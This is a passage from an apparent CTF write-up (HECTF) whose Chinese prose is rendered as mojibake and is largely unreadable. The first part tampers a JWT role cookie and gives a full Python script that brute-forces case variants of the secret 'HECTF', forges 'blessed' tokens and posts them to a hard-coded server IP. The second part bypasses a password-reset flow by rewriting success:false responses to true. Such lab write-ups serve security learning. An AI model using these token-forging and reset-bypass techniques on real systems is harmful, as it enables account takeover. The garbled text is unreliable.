å˜¿å˜¿ï¼Œè¿™æ˜¯ç§˜å¯†ï¼Œä½ è¯•è¯•å°±çŸ¥é“å•¦ã€‚</span></span><br><span class="line"><span class="comment">    A: è¡Œå§ï¼Œä½ çœŸè®¨åŒã€‚</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹ç¬¬ä¸€ä¸ªé—¨å°±æ­£å¸¸æŒ‰æŒ‰é¼ æ ‡å°±å¼€äº†ï¼Œå¤šç‚¹å¾ˆå¤šæ¬¡è€Œå·²ï¼Œç¬¬äºŒä¸ªé—¨æ˜¯åªæœ‰ vip å‹‡è€…èƒ½è¿›ï¼Œç‚¹å‡»è·å–ä»¤ç‰Œï¼Œç„¶åæŠ“åŒ…å‘ç° Cookieï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">role=user; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoicGxheWVyIiwiYmxlc3NlZCI6ZmFsc2UsImV4cCI6MTc2NjIyNTY0OH0.H10-DibPmALQ0RyNSp08JlQlL4Rmc7wo8cOd1kau1-U</span><br></pre></td></tr></table></figure><p>â€‹çœ‹èµ·æ¥æ˜¯ Jwt è§£å¯†ï¼Œrole ä¹Ÿæ˜¯ userï¼Œå§‘ä¸”æŠŠ user æ¢æˆ vipï¼ˆè¿™é‡Œæ˜¯å°å†™ï¼Œå› ä¸ºå¤§å†™ç»•ä¸è¿‡ï¼‰ç»•è¿‡ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/5bb50394aa244e94b547393321dd3775.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><blockquote><p>VIP é€šé“ç•…é€šï¼ä½†å®è—ä»è¢«å°å°â€¦â€¦</p></blockquote><p>â€‹è¯´æ˜å¾—å¼€ç¬¬ä¸‰é—¨ï¼ŒJwt è§£å¯†çœ‹çœ‹ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/1f975b6985d74ee79114d697ef570032.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹æ ¹æ®è¿™ä¸ªçŒœæµ‹æŠŠ blessed æ¢æˆ true å³å¯ï¼Œé‚£ä¹ˆå°±æ˜¯çŒœæµ‹å¯†é’¥çš„é—®é¢˜äº†ï¼Œæ ¹æ®ä¸Šé¢æ³¨é‡Šï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">    A: ä»€ä¹ˆï¼Ÿï¼Ÿï¼Ÿæˆ‘ä»¬æ˜¯ä¸æ˜¯å¥½å…„å¼Ÿï¼Œä½ èƒŒç€æˆ‘å·å·æ‰“ä»€ä¹ˆæ¯”èµ›ï¼Ÿï¼Ÿï¼Ÿ</span><br><span class="line">    B: æ²¡æœ‰å•¦ï¼Œä½ è¦æ‰“å—ï¼ŒHECTFï¼Œæ¥ç©å§ã€‚</span><br><span class="line">    A: å¯ä»¥å•Šï¼å¤Ÿå…„å¼Ÿçš„ï¼ŒHECTFæ˜¯å¤§å†™è¿˜æ˜¯å°å†™ï¼Œæˆ‘å»æœæœã€‚</span><br><span class="line">    B: å˜¿å˜¿ï¼Œè¿™æ˜¯ç§˜å¯†ï¼Œä½ è¯•è¯•å°±çŸ¥é“å•¦ã€‚</span><br><span class="line">    A: è¡Œå§ï¼Œä½ çœŸè®¨åŒã€‚</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>â€‹å…ˆè¯´äº† HECTF æ˜¯å¤§å†™è¿˜æ˜¯å°å†™ï¼Œç„¶ååé¢åˆè¯´äº† è¿™æ˜¯ç§˜å¯†ï¼Œè‰ï¼Œå‘åœ¨è¿™é‡Œå•Šï¼ŒHECTF å°±æ˜¯å¯†é’¥ï¼Œå—ï¼Ÿé‚£ä¹ˆå¯†é’¥çš„å¤§å†™å’Œå°å†™å°±æ˜¯é—®é¢˜äº†ï¼Œç›´æ¥çˆ†ç ´ï¼Œä¸‹é¢è¿™ä¸ªä»£ç ç›´æ¥è¿è¡Œå°±èƒ½çˆ†ç ´å‡º flagï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> RequestException</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_hectf_jwt_list</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;ç”ŸæˆHECTFæ‰€æœ‰å¤§å°å†™ç»„åˆå¯¹åº”çš„JWTåˆ—è¡¨ï¼ˆè¿”å›ï¼š[(å¯†é’¥, JWTä»¤ç‰Œ), ...]ï¼‰&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 1. å›ºå®šJWT Headerï¼ˆä¸ä½ æä¾›çš„tokenæ ¼å¼ä¸€è‡´ï¼‰</span></span><br><span class="line">    jwt_header = &#123;</span><br><span class="line">        <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">        <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. å›ºå®šJWT Payloadï¼ˆä¸ä½ æä¾›çš„tokenè½½è·ä¸€è‡´ï¼Œå¯æŒ‰éœ€è°ƒæ•´blessed/expå­—æ®µï¼‰</span></span><br><span class="line">    jwt_payload = &#123;</span><br><span class="line">        <span class="string">&quot;user&quot;</span>: <span class="string">&quot;player&quot;</span>,</span><br><span class="line">        <span class="string">&quot;blessed&quot;</span>: <span class="literal">True</span>,  <span class="comment"># å¯å°è¯•æ”¹ä¸ºFalseæµ‹è¯•ä¸åŒçŠ¶æ€</span></span><br><span class="line">        <span class="string">&quot;exp&quot;</span>: <span class="number">1766225297</span>  <span class="comment"># è‹¥æç¤ºä»¤ç‰Œè¿‡æœŸï¼Œå¯æ”¹ä¸ºå½“å‰æ—¶é—´æˆ³+3600ï¼ˆä¾‹å¦‚int(time.time())+3600ï¼‰</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. ç”ŸæˆHECTFæ‰€æœ‰å¤§å°å†™ç»„åˆï¼ˆ2^5=32ç§ï¼‰</span></span><br><span class="line">    base_chars = <span class="string">&quot;HECTF&quot;</span></span><br><span class="line">    char_options = [[c.upper(), c.lower()] <span class="keyword">for</span> c <span class="keyword">in</span> base_chars]</span><br><span class="line">    hectf_secret_list = [<span class="string">&#x27;&#x27;</span>.join(comb) <span class="keyword">for</span> comb <span class="keyword">in</span> itertools.product(*char_options)]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4. ç”Ÿæˆæ¯ä¸ªå¯†é’¥å¯¹åº”çš„JWT</span></span><br><span class="line">    jwt_list = []</span><br><span class="line">    <span class="keyword">for</span> secret <span class="keyword">in</span> hectf_secret_list:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            jwt_token = jwt.encode(</span><br><span class="line">                payload=jwt_payload,</span><br><span class="line">                key=secret,</span><br><span class="line">                algorithm=<span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">                headers=jwt_header</span><br><span class="line">            )</span><br><span class="line">            <span class="comment"># å…¼å®¹pyjwtä¸åŒç‰ˆæœ¬çš„è¿”å›æ ¼å¼ï¼ˆéƒ¨åˆ†ç‰ˆæœ¬è¿”å›bytesï¼Œéœ€è½¬ä¸ºå­—ç¬¦ä¸²ï¼‰</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(jwt_token, <span class="built_in">bytes</span>):</span><br><span class="line">                jwt_token = jwt_token.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            jwt_list.append((secret, jwt_token))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;âš ï¸  å¯†é’¥ <span class="subst">&#123;secret&#125;</span> ç”ŸæˆJWTå¤±è´¥ï¼š<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> jwt_list</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_jwt_batch</span>(<span class="params">target_url, jwt_list</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;æ‰¹é‡æµ‹è¯•JWTæœ‰æ•ˆæ€§ï¼Œç²¾å‡†è¯†åˆ«æ— æ•ˆä»¤ç‰Œå“åº”ï¼Œä¼˜åŒ–è¾“å‡º&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 1. å›ºå®šè¯·æ±‚å¤´ï¼ˆå¤ç”¨åŸå§‹è¯·æ±‚å¤´ï¼ŒåŠ¨æ€æ›¿æ¢Cookieï¼‰</span></span><br><span class="line">    base_headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://47.100.66.83:32714&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://47.100.66.83:32714/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. å›ºå®šè¯·æ±‚ä½“ï¼ˆå¯æŒ‰éœ€ä¿®æ”¹dooræˆ–courageå‚æ•°ï¼‰</span></span><br><span class="line">    request_body = <span class="string">&quot;door=C&amp;courage=1500&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. æ— æ•ˆä»¤ç‰Œå“åº”æ ‡è¯†ï¼ˆç”¨äºè¿‡æ»¤å†—ä½™è¾“å‡ºï¼‰</span></span><br><span class="line">    invalid_token_msg = <span class="string">&quot;æ— æ•ˆçš„ç¥åœ£ä»¤ç‰Œ&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;ğŸš€ å¼€å§‹æ‰¹é‡æµ‹è¯•ï¼Œå…±<span class="subst">&#123;<span class="built_in">len</span>(jwt_list)&#125;</span>ä¸ªJWTä»¤ç‰Œ...&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;ğŸ“Œ æ— æ•ˆä»¤ç‰Œå“åº”å°†è‡ªåŠ¨æ ‡è®°ï¼Œä»…é«˜äº®å¼‚å¸¸/æœ‰æ•ˆç»“æœ\n&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)  <span class="comment"># å»¶è¿Ÿ1ç§’ï¼Œä¾¿äºæŸ¥çœ‹æç¤ºä¿¡æ¯</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> idx, (secret, jwt_token) <span class="keyword">in</span> <span class="built_in">enumerate</span>(jwt_list, <span class="number">1</span>):</span><br><span class="line">        <span class="comment"># åŠ¨æ€æ„é€ Cookie</span></span><br><span class="line">        current_headers = base_headers.copy()</span><br><span class="line">        current_headers[<span class="string">&quot;Cookie&quot;</span>] = <span class="string">f&quot;role=VIP; token=<span class="subst">&#123;jwt_token&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># å‘é€POSTè¯·æ±‚</span></span><br><span class="line">            response = requests.post(</span><br><span class="line">                url=target_url,</span><br><span class="line">                headers=current_headers,</span><br><span class="line">                data=request_body,</span><br><span class="line">                timeout=<span class="number">10</span></span><br><span class="line">            )</span><br><span class="line">            response_text = response.text.strip()</span><br><span class="line">            status_code = response.status_code</span><br><span class="line"></span><br><span class="line">            <span class="comment"># åˆ†ç±»è¾“å‡ºç»“æœ</span></span><br><span class="line">            <span class="keyword">if</span> invalid_token_msg <span class="keyword">in</span> response_text <span class="keyword">and</span> status_code == <span class="number">403</span>:</span><br><span class="line">                <span class="comment"># æ— æ•ˆä»¤ç‰Œï¼Œç®€åŒ–è¾“å‡º</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;ç¬¬<span class="subst">&#123;idx:2d&#125;</span>ä¸ª | å¯†é’¥: <span class="subst">&#123;secret&#125;</span> | çŠ¶æ€: 403ï¼ˆæ— æ•ˆä»¤ç‰Œï¼‰&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># éæ— æ•ˆä»¤ç‰Œå“åº”ï¼Œè¯¦ç»†è¾“å‡ºï¼ˆå¯èƒ½æ˜¯æœ‰æ•ˆç»“æœæˆ–å…¶ä»–å¼‚å¸¸ï¼‰</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\n===== ç¬¬<span class="subst">&#123;idx:2d&#125;</span>ä¸ªæµ‹è¯•ï¼ˆéæ— æ•ˆä»¤ç‰Œï¼‰======&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;å¯†é’¥: <span class="subst">&#123;secret&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;JWT: <span class="subst">&#123;jwt_token&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;çŠ¶æ€ç : <span class="subst">&#123;status_code&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;å“åº”å†…å®¹: <span class="subst">&#123;response_text&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">60</span> + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># æ£€æµ‹flagå…³é”®è¯ï¼Œæ‰¾åˆ°æœ‰æ•ˆç»“æœç«‹å³ç»ˆæ­¢</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> response_text.lower():</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;ğŸ‰ æ‰¾åˆ°æœ‰æ•ˆJWTï¼å¯†é’¥ï¼š<span class="subst">&#123;secret&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;ğŸ‰ å®Œæ•´å“åº”ï¼š<span class="subst">&#123;response_text&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> secret, jwt_token</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> RequestException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="comment"># è¯·æ±‚å¼‚å¸¸ï¼Œè¯¦ç»†è¾“å‡º</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n===== ç¬¬<span class="subst">&#123;idx:2d&#125;</span>ä¸ªæµ‹è¯•ï¼ˆè¯·æ±‚å¼‚å¸¸ï¼‰======&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;å¯†é’¥: <span class="subst">&#123;secret&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;JWT: <span class="subst">&#123;jwt_token&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;âŒ å¼‚å¸¸ä¿¡æ¯ï¼š<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">60</span> + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nğŸ” æ‰¹é‡æµ‹è¯•å®Œæˆï¼&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;æç¤ºï¼šè‹¥å…¨éƒ¨ä¸º403æ— æ•ˆä»¤ç‰Œï¼Œå¯å°è¯•ï¼š&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  1. ä¿®æ”¹JWT Payloadä¸­çš„blessedå­—æ®µï¼ˆTrue/Falseäº’æ¢ï¼‰&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  2. æ›´æ–°expæ—¶é—´æˆ³ä¸ºå½“å‰æœ‰æ•ˆæ—¶é—´ï¼ˆé¿å…ä»¤ç‰Œè¿‡æœŸï¼‰&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  3. è°ƒæ•´è¯·æ±‚ä½“ä¸­çš„doorï¼ˆA/B/Cï¼‰æˆ–courageå‚æ•°å€¼&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># ç›®æ ‡URL</span></span><br><span class="line">    TARGET_URL = <span class="string">&quot;http://47.100.66.83:31648/enter&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1. ç”ŸæˆJWTåˆ—è¡¨</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ğŸ“Œ æ­£åœ¨ç”ŸæˆHECTFæ‰€æœ‰å¤§å°å†™ç»„åˆçš„JWT...&quot;</span>)</span><br><span class="line">    jwt_test_list = generate_hectf_jwt_list()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;ğŸ“Œ å…±ç”Ÿæˆ<span class="subst">&#123;<span class="built_in">len</span>(jwt_test_list)&#125;</span>ä¸ªæœ‰æ•ˆJWTä»¤ç‰Œ\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. æ‰¹é‡æµ‹è¯•</span></span><br><span class="line">    valid_secret, valid_jwt = test_jwt_batch(TARGET_URL, jwt_test_list)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. æœ€ç»ˆç»“æœæ±‡æ€»</span></span><br><span class="line">    <span class="keyword">if</span> valid_secret <span class="keyword">and</span> valid_jwt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\nâœ… æµ‹è¯•æˆåŠŸï¼&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;æœ‰æ•ˆå¯†é’¥ï¼š<span class="subst">&#123;valid_secret&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;æœ‰æ•ˆJWTï¼š<span class="subst">&#123;valid_jwt&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\nâŒ æœªæ‰¾åˆ°æœ‰æ•ˆJWTï¼Œå¯å‚è€ƒæç¤ºè°ƒæ•´å‚æ•°åé‡è¯•ã€‚&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="è°å®¶blogé‡Œæœ‰è¿™åŠŸèƒ½"><a class="markdownIt-Anchor" href="#è°å®¶blogé‡Œæœ‰è¿™åŠŸèƒ½">#</a> è°å®¶ blog é‡Œæœ‰è¿™åŠŸèƒ½ï¼Ÿ</h2><blockquote><p>Bob åœ¨å®¿èˆé‡Œé—²çš„ damn ç–¼ï¼Œä¸çŸ¥é“å¹²ä»€ä¹ˆï¼Œä»–çš„æœ‹å‹ Alice æœ€è¿‘æ•´äº†ä¸ªä¸ªäººåšå®¢ä¸»é¡µï¼Œæœ€è¿‘å‡ å¤©å¤© å¤©åœ¨ä»–é¢å‰ç‚«è€€ï¼Œä»–è§‰å¾—å¿ƒç†å¾ˆä¸çˆ½ï¼Œæœ‰ç§è¢«æœ‹å‹å†…å·è‡ªå·±å´åœ¨æ‘†çƒ‚è€Œæ„Ÿè§‰åˆ°äº†èƒŒå›çš„æ„Ÿè§‰ï¼Œäºæ˜¯ ä»–è´¹å°½å¿ƒåŠ›ç»ˆäºæ£é¼“å‡ºæ¥äº†ä¸€ä¸ªï¼Œä½†æ˜¯ä»–æ“å‡ºæ¥çš„ç½‘ç«™æœ‰ä¸€äº›å…¶ä»–åšå®¢ä½œè€…ä¸ä¼šæœ‰çš„åŠŸèƒ½â€¦</p><p>æ³¨æ„ï¼šç”±äºå‡ºé¢˜äººå­¦è‰ºä¸ç²¾çš„é—®é¢˜ï¼Œåœ¨åšé¢˜è¿‡ç¨‹ä¸­å¯èƒ½ä¼šå‡ºç°ç½‘ç«™æ— æ³•è®¿é—®çš„æƒ…å†µï¼Œå¯èƒ½æ˜¯ exit æŠŠ æ•´ä¸ªç¨‹åºåœæ‰äº†ï¼Œè¯·ç­‰å¾…ä¸‰åç§’ï¼Œä¸‰åç§’ååº”è¯¥ä¼šé‡æ–°å¯åŠ¨ï¼Œè‹¥ä¸‰åç§’åæ²¡æœ‰å¯åŠ¨çš„ï¼Œå¯ä»¥é‡å¯ç¯ å¢ƒã€‚</p></blockquote><p>â€‹ä¸€èˆ¬ç±»ä¼¼çš„ CMS çš„é¢˜ç›´æ¥ç™»åå°çˆ†ç ´å¼±å£ä»¤ç¢°ç¢°è¿æ°”ï¼Œä¸è¿‡è¿™ä¸ªæœ‰å¯èƒ½çˆ†ä¸å‡ºæ¥ï¼Œä½†å­˜åœ¨å¿˜è®°å¯†ç çš„æ¥å£ï¼Œè¿™ä¸ªæ˜¯å¾ˆå¤šæ¼æ´çš„å¯ä»¥åˆ©ç”¨çš„ç‚¹ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥èµŒä¸€æŠŠè¯•è¯•çœ‹ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/0b7f258b54284828a595288be2af6157.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹è¿™é‡Œçœ‹ url ä¼¼ä¹æœ‰å¯ä»¥åˆ©ç”¨çš„ç‚¹ï¼Œæµ‹æµ‹çœ‹æ˜¯å¦å­˜åœ¨è¿™ç§é€»è¾‘æ¼æ´ï¼ˆå‰ç«¯å¯¹åç«¯å“åº”è¿›è¡ŒéªŒè¯ï¼Œç„¶åè·³è½¬åˆ°ç¬¬äºŒä¸ªé‡ç½®å¯†ç çš„é¡µé¢ï¼Œä»¥æ­¤ç±»æ¨ï¼Œç›´åˆ°æœ€åçš„ä¸€ä¸ªé¡µé¢ï¼Œå½“åç«¯è®¤ä¸ºå‰ä¸¤æ¬¡éªŒè¯å·²ç»å®Œæˆäº†ï¼Œä¸éœ€è¦è¿›è¡Œåç»­éªŒè¯ï¼Œä¹‹ç±»å¯èƒ½ä¼šå­˜åœ¨ä»»æ„å¯†ç ä¿®æ”¹çš„æ´ï¼Œä¸è¿‡å®é™…æƒ…å†µä¸‹åº”è¯¥å¤§éƒ¨åˆ†éƒ½ä¿®äº†ï¼Œæˆ‘è¿™é‡Œåªæ˜¯æ¨¡æ‹Ÿè¿™ä¸ªæ´çš„ç‚¹ï¼Œä¸ä¼šæ ¹å®é™…æƒ…å†µä¸€æ ·ï¼‰ï¼Œè¿™é‡ŒæŠ“ä¸€ä¸‹å“åº”åŒ…çœ‹çœ‹ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/5d019db2e5564085ab796870ff274f3c.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹ç›¸åº”åŒ…ä¹‹ç±»å¯ä»¥ä¿®æ”¹ <code>&quot;success&quot;:false</code>  ä¸º <code>&quot;success&quot;:true</code> ï¼ŒæˆåŠŸè·³è½¬åˆ°ç¬¬äºŒæ¬¡éªŒè¯ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/a75aba59a26843f48f48e6468991d450.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹ä¹‹åéšä¾¿è¾“ï¼ŒæŠ“åŒ…çœ‹çœ‹ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/a45d5b829423438aa2fc8f4c71c039ed.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹åŸæœ¬çš„ step1 å˜æˆäº† step2ï¼Œå¯ä»¥çŒœçŒœçœ‹æœ€åçš„ä¸€æ­¥å¯ä»¥æ˜¯ step3 æˆ–è€… step4ï¼Œä¸è¿‡è¿™é‡Œè¿˜æ˜¯è€è€å®å®ä¸€æ­¥æ­¥ä¸‹å»ï¼Œè€æ ·å­ï¼ŒæŠ“ç›¸åº”åŒ…ï¼Œæ”¹å‚æ•°ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/4f4729bd09c3481a80760e7c0b7206ad.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹æˆåŠŸè·³è½¬åˆ°è¿™ä¸€æ­¥ï¼Œé‚£å°±ä¿®æ”¹å¯†ç ä¸º 123ï¼Œä¹‹åæŠ“åŒ…çœ‹çœ‹ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/8a4c9d39a2824acb9621a37fdcfb4b65.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹ä¹‹åæŠ“ç›¸åº”åŒ…çœ‹çœ‹ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/3c81973b813449a99324d2e11838bf54.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br> 